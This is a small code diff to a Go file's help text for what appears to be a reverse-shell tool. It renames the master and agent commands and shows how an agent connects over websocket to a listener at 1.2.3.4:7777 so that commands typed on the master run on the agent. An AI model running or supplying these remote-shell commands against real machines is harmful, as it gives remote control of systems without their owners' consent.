@@ -14,10 +14,10 @@ import (
 
 const (
 	websocketListenerExample = `# On the master (1.2.3.4)
-$ master listen -P 7777
+$ reverse-shell-master listen --port 7777
 
 # On the agent
-$ agent websocket -U http://1.2.3.4:7777
+$ reverse-shell-agent websocket --url http://1.2.3.4:7777
 
 Once an agent connects, you will be able to write commands in *stdin* that will be directly executed on the agent. You can also connect to a rendezvous point instead of a master.
 
